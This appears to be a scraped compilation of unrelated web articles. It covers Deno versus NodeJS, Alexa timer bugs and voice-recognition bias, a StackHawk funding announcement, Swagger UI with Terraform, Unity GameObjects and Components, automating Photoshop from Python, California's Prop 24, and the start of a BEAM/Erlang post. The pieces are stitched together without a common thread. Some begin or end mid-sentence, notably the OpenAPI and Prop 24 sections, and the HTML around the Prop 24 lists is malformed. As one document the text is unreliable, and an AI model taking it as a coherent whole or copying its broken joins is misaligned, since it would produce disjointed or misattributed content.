<span id="cb9-10"><a href="#cb9-10"></a>  <span>req</span><span>.</span><span>respond</span>(<span>{</span> body<span>:</span> <span>'Running server!!'</span> <span>}</span>)<span>;</span></span>
<span id="cb9-11"><a href="#cb9-11"></a><span>}</span></span></code></pre></div>
<p>Deno supports promises out of the box. In the first example, the <code>await</code> keyword waits until <code>Deno.open</code> is resolved and its result is stored in the <code>file</code> variable. In the second example, <code>server</code> is an async iterator and the <code>for await</code> keywords are used to iterate them, each item will be a new incoming request.</p>

<p>Deno has incredible features, but there are two points that I think can be improved: - The permission flags could be handled in a different way like using a file that allows us to set the flags. If your code needs almost all the permissions you will have to use a long command. However, this is not a big issue on itself. - About the dependencies, NodeJS has a better project organization and the <code>lock</code> file is generated automatically. With Deno your dependencies will be placed in one directory, and to lock the dependencies you need to run an additional command. This might not be a good developer experience, but the community is working on some alternatives to change this.</p>
<p>Another point I would like to mention is regarding the examples and tutorials. On the NodeJS side, you can find a lot of examples/tutorials of any library or functionality you may need, while with Deno there are few examples/tutorials. But it will increase in the future for sure.</p>
<p>In this <a href="https://github.com/stackbuilders/deno-example">link</a> you will find a small example using Deno and Typescript that shows how to create routes with the <code>oak</code> module, submit data from a form and generate a CSV file with the provided data.</p>
<h2 id="conclusion">Conclusion:</h2>
<p>Deno is a good alternative for increasing security that allows us to use TypeScript without extra configurations or …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I loved my Amazon Echo when they first came out. I love to cook, and I love to listen to music, so my Amazon Echo naturally won a spot in my kitchen when I first got it. Later on, it got upgraded to a Sonos One. Both speakers had voice control features that I loved, and used all the time. Hands-free timer setting and music control? Sign me up! However, Alexa’s shine has started to wear off - especially in the last six months. What’s changed?</p><p>Just in the last week or two, I’ve noticed a pretty serious bug in the Alexa software: its timers are not playing alarms when they expire! I can set a timer on my Sonos One using Alexa, open the Alexa app, and watch the timer count down to “00:00:00”. I expected hitting “00:00:00” to result in a tone from the speaker, like it’s done reliably for years. Instead: silence. As if to add insult to injury, the timer stays in the Alexa app, stuck forever at “00:00:00”. I’m not certain if this is a Sonos problem, or an Alexa problem - I see this behavior on my Sonos One, but not on my Sonos Move.</p><p>Whatever the case, it’s very literally burnt my biscuits. I do, primarily, use it as a kitchen timer, and it’s hard not to notice a bug that ruins your food!</p><p>Alexa unquestionably has a much lower success rate understanding my wife’s voice than mine. At first, I chalked this up to a matter of training, and understanding how the voice recognition technology works. I’ve participated in the development of a few voice speakers. I know that the best results come when you face the speaker, and speak slowly, clearly, and without pausing. Even with coaching to do this, Alexa either fails to understand my wife, or ignores her completely, at a rate of at least twice my own.</p><p>Unfortunately, I think I know the reason for this, and it’s not a pretty one. Voice assistant software naturally has a better success rate when tested against speech signals with lower frequency ranges. As a result, they naturally have better chance of understanding deeper voices, which predisposes them to understand men better than women. I thought this was just paranoid suspicion on my part, but <a href="https://www.techradar.com/news/smart-speakers-understand-men-better-than-women-according-to-study">I’m not the only one who has noticed this phenomenon</a>. Not to mention that it’s hard to argue with a plot of Voice Command Success Rate against average input frequency. The trend just goes down, down, down as the average input frequency increases.</p><p>It’s a disappointing bias set by technology.</p><p>I also get the impression that the quality of voice interactions has gone downhill over time. No longer does Alexa magically find the thing I want to do - whether that’s set a timer, add an item to a grocery list, or start playing a particular album I want to hear. I find myself leaning, more and more, on my smartphone to queue up music. Alexa is just not up to the task on any given day.</p><p>I have to admit that this might not be a real problem - or, rather, not a change in the voice recognition software. The only thing I know for sure has changed in the last six months is that I’m home a <em>lot</em> more. Working from home has given me many more opportunities to use my voice speaker. I’d estimate that, pre-COVID, I used the voice control functionality maybe five times a day, in two discrete blocks: in the morning, before leaving for work, and in the evening, after getting back home. Working from home has blown that schedule out of the water. Instead of a two-hour window at the start and end of each day, I’m at home <em>_</em>all the time_. This gives me more opportunities to use my voice speaker. Correspondingly, it gives more opportunities for Alexa to fail to meet my expectations.</p><p>Having previously worked at a company that makes voice speakers, I understand that there’s such a thing as an acceptable failure rate of voice transactions. (The terms of art are “False Accepts” and “False Rejects”, if you’re curious.) This leads me to wonder: is Alexa’s voice assistant technology getting worse, or am I just using it enough to expose its warts?</p><p>For example: let’s say I use the speaker an average of once per hour. If I’m home for four hours a day (like I was pre-pandemic), that averages out to four voice commands per day. If a voice command fails, on average, one time in twenty, this is likely an acceptable failure rate. It’s easy to forget a failed voice command if it only happens, on average, once a week or so.</p><p>Now, though, I’m <em>always</em> home. That gives me sixteen waking hours in which to issue voice commands. If we’re holding constant the once-per-hour rate of voice commands, and the one-in-twenty rate of failed voice transactions, then failures of the voice assistant start becoming a <em>daily</em> occurrence, rather than a weekly one. I suspect that this passes some sort of psychological threshold: even though the overall failure rate has not changed, I notice more failures just because the time between failures decreases. Since it’s now a daily occurrence instead of a weekly one, I have less other minutiae going on in my life to help me forget Alexa’s shortcomings.</p><p>I’d imagine the folks at Amazon would consider this a pretty serious problem, even though their underlying metrics for Alexa’s accept/reject rates likely haven’t changed at all. Being a consumer good, <em>perception</em> of its quality is almost as important as the reality of it!</p></div></div>]]>

<p>DENVER, CO — Oct 27, 2020 — Application security startup StackHawk announced today that it has raised a $10 million in Series A funding. The pre-emptive, oversubscribed round was led by <a href="https://sapphireventures.com/">Sapphire Ventures</a> and included return seed backers Foundry Group, Costanoa Ventures, Flybridge Capital, and Matchstick Ventures. Launched just over a year ago, StackHawk has seen significant demand as a platform that helps developers implement security testing before applications are pushed into production — a trend in the industry known as “shifting security left.”</p>



<p>With widespread adoption of DevOps over the past decade, companies are shipping software to production more frequently than before, with many companies pushing to production multiple times per day. The traditional models of application security testing such as quarterly penetration tests or scheduled scans of the production application have struggled to keep up with this shift, resulting in inefficiencies and increased risk exposure. Modern companies, however, are integrating application security into their DevOps practices, checking for vulnerabilities early in the software development life cycle. This approach vastly shortens the time to find and fix vulnerabilities, leading to efficient development and secure applications.</p>



<p>StackHawk is an application security testing platform that allows DevOps teams to instrument automated dynamic application security testing (DAST) in the CI/CD pipeline. With this approach, engineering teams can instrument automated testing with every pull request, ensuring that vulnerabilities are caught long before they hit production. And with a strong focus on features for software developers, application security can scale across the engineering organization, creating significant efficiencies in fixing security bugs.</p>



<p>Adrián Moreno Peña, Tech Lead at VanMoof, describes the company’s use of StackHawk, “At VanMoof we work fast and lean, in a DevOps-way of working with empowered teams using smart tools to handle their work. It was about time to find InfoSec tools that fit with our vision — high productivity tools, flexible, adaptable and created with developers in mind. Using StackHawk we can make our security improvement process transparent, actionable and easy to understand for each developer in the team, applying best practices and preventing security issues from going to production.”</p>



<p>The modern approach to application security also resonates with Katie Teitler, industry analyst at TAG Cyber. “Coming early into the development lifecycle is an attractive proposition, both for development lifecycles and for security teams,” said Teitler. “Since the platform is lightweight and quick to deploy through Docker, devs should feel instantly comfortable with it.”</p>



<p>The StackHawk founding team has leveraged their backgrounds in DevOps and security to build the product that puts application security in developer’s hands. Joni Klippert, StackHawk founder &amp; CEO, has spent the past decade building DevOps products, most recently as the VP, Product at VictorOps (acquired by Splunk).&nbsp;</p>



<p>“Digital Transformation has allowed for automation of many tasks associated with building, delivering and operating software in production. DevOps automation enables companies to deliver business value to their customers faster than ever before,” said Klippert. “However, security practices are not keeping up with the speed of modern software delivery. StackHawk empowers software engineers to deliver secure software to their customers at the speed of DevOps.”&nbsp;</p>



<p>The focus on integrating into the modern engineering workflow and building features for developers was a leading factor for Sapphire to lead the round. “With the rise of DevOps, companies have shifted to the frequent release of software and reliance on automation. How companies approach application security should be no different,” says David Hartwig, Managing Director at Sapphire Ventures. “We believe that StackHawk has the product and the team in place, led by Founder and CEO Joni Klippert, to deliver on developer-first automated application security testing in the DevOps pipeline, and we are excited to partner with them along their journey.”</p>



<p>With the additional capital, StackHawk will continue product development, invest in go-to-market teams, and continue to support ZAP, the open source project that the company’s platform is built upon.&nbsp;</p>

People can read it and it communicates the intent, but it’s different for every API.</p> <p>OpenAPI (formerly Swagger) is a <strong>standardized format that describes how an API works</strong>. It captures the important parts of the documentation and defines a structure for it:</p> <div><div><pre><code><span>paths</span><span>:</span>
  <span>/user</span><span>:</span>
    <span>get</span><span>:</span>
      <span># ...</span>
    <span>post</span><span>:</span>
      <span># ...</span>
      <span>requestBody</span><span>:</span>
        <span># ...</span>
  <span>'</span><span>/user/{userid}'</span><span>:</span>
    <span>parameters</span><span>:</span>
    <span>-</span> <span>name</span><span>:</span> <span>userid</span>
      <span>in</span><span>:</span> <span>path</span>
      <span>required</span><span>:</span> <span>true</span>

    <span>delete</span><span>:</span>
      <span># ...</span>
</code></pre></div></div> <p>The advantage of a standard format is that general-purpose tools can process it. One such tool is <a href="https://swagger.io/tools/swagger-ui/">Swagger UI</a> which provides <strong>interactive documentation</strong> for the API and allows easy experimentation in a familiar format.</p> <p>It provides a list of methods, so it’s easy to get an overview of how the API is structured:</p> <p><img alt="Swagger UI lists the available methods" integrity="sha256-iSVYciDpAz9zVxlnfTJLvhOZHro35bjx4BeaVJ98yp0=" crossorigin="anonymous" src="https://advancedweb.hu/assets/posts/api_docs_terraform/methods-8925587220e9033f735719677d324bbe13991eba37e5b8f1e0179a549f7cca9d.png"></p> <p>It also allows calling the methods, even with a request body:</p> <p><img alt="Send a POST with a request body" integrity="sha256-U1zQShkw479Cub/kAbcK+VE5rfv+5ByyZ3RZqcYr9Fo=" crossorigin="anonymous" src="https://advancedweb.hu/assets/posts/api_docs_terraform/create-535cd04a1930e3bf42b9bfe401b70af95139adfbfee41cb2677459a9c62bf45a.png"></p> <p>Generates copy-pastable Curl examples for the requests along with the response:</p> <p><img alt="Swagger UI shows the response and a Curl example" integrity="sha256-MpF9tEDrUNMFxHaB4q3+1u4jeoRcvM0xPPcWfsFRh2o=" crossorigin="anonymous" src="https://advancedweb.hu/assets/posts/api_docs_terraform/post_response-32917db440eb50d305c47681e2adfed6ee237a845cbccd313cf7167ec151876a.png"></p> <p>And supports path parameters too:</p> <p><img alt="Swagger UI supports path parameters too" integrity="sha256-MJc8mKSFe4VzQw9W9piheZMSEekwibU5lvw1PunTxY0=" crossorigin="anonymous" src="https://advancedweb.hu/assets/posts/api_docs_terraform/delete-30973c98a4857b8573430f56f698a179931211e93089b53996fc353ee9d3c58d.png"></p> <p>This provides developers an easy way to try out the API without first reading the informal documentation and figuring out how each part works.</p> <p>Let’s see how to deploy a live API with Swagger UI using Terraform!</p> <p> Learn the services needed to build a serverless HTTP-based API on AWS from our <a href="#" data-toggle="modal" data-target="#contextual-promo-popup">free email course</a> . </p> <h2 id="swagger-ui-webpage">Swagger UI webpage</h2> <p>The Swagger UI runs entirely on the client-side.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on
<a href="https://unity.com/how-to/architect-game-code-scriptable-objects">architecting your game with ScriptableObjects</a>,
based on <a href="https://www.youtube.com/watch?v=raQ3iHhE_Kk">the talk</a> by Ryan
Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that
propagate <em>messages</em> (described in the <a href="#component"><strong>Component</strong></a> section) to
all components in or under it.</p><figure><p><span>

User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>

      <section id="main_content">
        
<p>This is a brief blog post describing my experience with automating Photoshop using Python.
I am an experienced software developer, but had never really used Photoshop before. As you can tell from my wonderful programmer art in this post ;)</p>

<p>Here’s the <a href="https://www.adobe.com/content/dam/acom/en/devnet/photoshop/pdfs/photoshop-cc-vbs-ref.pdf">Adobe documentation</a> my work was based on.</p>

<p>Here’s a link to <a href="https://github.com/loonghao/photoshop-python-api">another project</a> that could also be of interest. <strong>I have not used their code,</strong> but it looks very promising.</p>

<p>The sample code and repo source code have been <strong>tested on Python 2.7</strong>, but should work fine on Python 3.
<a href="https://github.com/kelvin0/ImageAutomation">Source code</a></p>

<h2 id="generating-images">Generating images</h2>
<p>Some time ago we needed a solution to be able to quickly generate some product images using Photoshop.</p>

<p>The graphic designer wanted to combine 2 images into a final product image to be used for display their products online.</p>
<ul>
  <li>An environment image (PSD file).</li>
  <li>An object image (jpg).</li>
  <li>Combine the above images into a product image (jpg).</li>
</ul>

<p>This was done manually in Photoshop and as expected was very time consuming and error prone.</p>

<p>The scenario described for generating an image might seem very simple, <strong>why use Photoshop at all, right?</strong> PIL, Skimage, OpenCV would work fine! Well in this case, there were some very fine transformations and image processing being done in Photoshop and the graphic designer needed all these features required in order to generate high-quality images using filter, shears and other exotic (for me at least) visual effects.</p>

<p><img src="https://github.com/kelvin0/ImageAutomation/blob/gh-pages/Combine_2_images.png?raw=true" alt="Combination of 2 images"></p>

<h2 id="smart-objects">Smart objects?</h2>
<p>Prior to my involvement, the graphic designer had been looking for a way to simplify and automate this image generation process.
An important feature that would be key to this work is the concept of <a href="https://helpx.adobe.com/ca/photoshop/using/create-smart-objects.html">Smart Objects</a></p>

<p><strong>Smart objects</strong> in Photoshop allow you to ‘link’ 2 or more PSD files. Any changes made to the linked PSD are automatically made to any PSD linking to it!
Basically you create a PSD file, and have one of the layers be a Smart Object. Then you link that Smart Object layer to another PSD.
Afterwards when you open the background image and the product image in Photoshop, <strong>any changes you make to the product image, also are made in the background image</strong>.</p>

<p>Another cool thing about Smart Objects: <strong>all the transformations within the Smart Object layer are preserved</strong>, regardless of the changes you make to the source PSD.</p>

<p><img src="https://github.com/kelvin0/ImageAutomation/blob/gh-pages/smart_objects_update.png?raw=true" alt="Smart Objects workflow"></p>

<p><strong>This requires:</strong></p>
<ul>
  <li>Each background image (PSD) must contain a layer with a Smart Object.</li>
  <li>The Smart Object layer has  to be linked to a default image (PSD).</li>
  <li>Works best if both PSD files reside in same directory.</li>
</ul>

<p><strong>The manual steps for generating a final product image becomes:</strong></p>
<ol>
  <li>Open the background image in Photoshop (mountains).</li>
  <li>Open the default product image in Photoshop (ball).</li>
  <li>Open the desired product image in Photoshop (star).</li>
  <li>Copy the desired product image into the default product image. This updates the Smart Object.</li>
  <li>Save the background image as JPEG. This is our final image we want to generate with mountains and the star.</li>
  <li>Repeat this for every background/product combination image we want to generate.</li>
</ol>

<h2 id="python-and-com">Python and COM</h2>
<p>As mentionned at the beginning, we will be using the Photoshop COM programming interface.
The <a href="https://www.adobe.com/content/dam/acom/en/devnet/photoshop/pdfs/photoshop-cc-vbs-ref.pdf">Photoshop reference PDF</a> will be our guide in writing our automation scripts. Of course we could be doing this directly in VB script, but it is much more fun (and productive!) to use Python.</p>

<p>Here’s a basic sample that opens an image in Photoshop.</p>

<div><div><pre><code><span>import</span> <span>win32com.client</span>

<span># This actually fires up Photoshop if not already running.
</span><span>ps</span> <span>=</span> <span>win32com</span><span>.</span><span>client</span><span>.</span><span>Dispatch</span><span>(</span><span>"Photoshop.Application"</span><span>)</span>

<span># Open an image file (PSD in our case)
</span><span>doc</span> <span>=</span> <span>ps</span><span>.</span><span>Open</span><span>(</span><span>r"X:\Path\To\My.psd"</span><span>)</span>
<span># ... do something ...
</span><span>doc</span><span>.</span><span>Close</span><span>()</span>

<span>ps</span><span>.</span><span>Quit</span><span>()</span> <span># Stops the Photoshop application
</span></code></pre></div></div>
<p>This works on Windows, but some other scripting language might be more appropriate for Mac OS.
We will not be covering other platforms.</p>

<p><strong>There is no headless mode when running Python/COM automation scripts.</strong></p>

<p>Each script command actually translates to an action you see happen on the screen.
I will get into this and other annoyances later.</p>

<h2 id="basic-recipe">Basic Recipe</h2>

<p>Here is some basic sample code that illustrates the automated steps to generate our final product image, which is a star on a background of mountains.</p>

<p>Notice also that we duplicate the PSD documents once we open them. We do this in order not to accidentally change and save the original PSD files.</p>

<p><strong>Important:</strong> working with Photoshop’s object containers is different than native Python lists and tuples. The indices are <strong>1-based</strong>, so the first element of container has index=1 (as opposed to index=0 as per usual).</p>

<h2 id="watch-out">Watch out!</h2>
<p>As mentionned earlier, even though there are quite a few advantages to automating with Photoshop, there are also quite a few points to consider.</p>

<p>Photoshop scripts require running an actual instance of Photoshop and it’s <strong>main window will be visible on the desktop</strong>.</p>

<p>The <strong>Photoshop window should not be minimized while running a script.</strong> This might actually block Photoshop, and prevent your automated task from running properly.</p>

<p>If you make use of <strong>Copy/Paste commands in your script, this will hijack your clipboard</strong>, and prevent any other user/application from using it properly.</p>

<p><strong>Photoshop tends to hang/freeze/crash periodically.</strong> The crashes are frequent on big batches of images and don’t seem to be related to RAM/CPU usage. Just restart your script and it will eventually run to completion just fine. Regardless of crashes, <strong>you can still make huge productivity gains from automating some tasks.</strong></p>

<p>For all these reasons, we <strong>highly recommend that any automated tasks you create should run on a dedicated Windows PC.</strong> You don’t need a high end PC for most tasks and this will definitely make everyone more productive.</p>

<h2 id="hope-this-was-useful">Hope this was useful</h2>
<p>Of course, most of the code and samples discussed here are related to the specific use case described.
Almost all Photoshop commands can be scripted this way. The sample code should help you get started, and more details can be found in Photoshop scripting reference.
<strong>If you need any help with your project, we will gladly share our expertise if required!</strong></p>

    <p>
      Proposition 24 is a 52-page law that overhauls privacy laws in California. It's so complex that it has split the privacy community, and experts disagree about what it would mean for Californians. Most voices agree Prop 24 has some changes to love, and some to reject. The typical voter is probably very uncertain about whether to vote "Yes" or "No".
    </p>
    <p>
      We are <strong>San Diego Privacy</strong>, a small group of privacy advocates in San Diego, and we'd like to help by offering a neutral analysis. Below you'll find 10 of the biggest issues with Prop 24, along with the main points supporters (the "Yes" side) and opponents (the "No" side) make about that issue.
    </p>
    <p>We suggest you first pick the issues in purple that jump out to you the most. Then, keep count of whether you find the Yes side or the No side more compelling, for the issues you've picked. Last, total up your counts.</p>
    <p>Then, as always, go vote your values.</p>

    <p><strong><i>Update</i></strong>: When you pick the issues below that matter to you, consider <a href="https://drive.google.com/drive/folders/1FSWtcqBEbe-SOUUWZ9d7j_M3Ft1ap5CR?usp=sharing" target="_blank">downloading a shareable image</a> of that issue as well, and posting it on social media to generate discussion.</p>

            <p>I feel strongly about <strong>Pay For Privacy</strong></p>
            <div>
              <p>
                <strong>Pay for Privacy</strong> means that if you demand privacy, companies can charge you more for goods and services.
              </p>
              <ul>
                <li>Companies that rely on targeted advertising, like newspapers or free streaming music services, currently rely on targeted ads.</li>
                <li>Some privacy options allow you to block the ability to show you targeted ads.</li>
                <li>Pay-for-privacy is already allowed in existing California law.</li>

                <p>
                   When interviewed, Prop 24 author Alastair Mactaggart warns the newspaper industry would be hit hard if pay-for-privacy options were blocked. (<a href="https://youtu.be/eWOFZOPJm78?t=2186" target="_blank">Union-Tribune video interview</a> with Yes on 24)

                  <li>Argues privacy is a constitutional right of Californians; it is not for sale.</li>
                  <li>Warns Prop 24 further emboldens businesses to charge consumers for privacy.</li>

        Authors' Note: It's important to emphasize here that pay-for-privacy is already allowed in current law. Opponents see Prop 24's choice to further expand pay-for-privacy, rather than ban it, as one reason to oppose it.

            <p>I feel strongly about <strong>Global Opt-Out</strong></p>
            <div>
              <p>
                <strong>Global Opt-Out</strong> allows you to set up your privacy options in one place, and have them apply universally. Prop 24 allows companies to ignore those global settings, in some cases.

              </p>
              <ul>
                <li>In the future, you'll be able to set your privacy preferences in one place, rather than at each site or service.</li>
                <li>Prop 24 includes provisions for allowing companies to ignore your global privacy preferences for certain reasons, like if they want you to pay.</li>
                <li>There could be other reasons companies won't have to respect your global privacy preferences.</li>

        Authors' Note: Privacy advocates feel very strongly that Californians should have the "private right of action," or the right to sue companies to enforce privacy law. It seems to us unlikely that privacy organizations will support overhauls to California's privacy laws without that private right of action being included.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
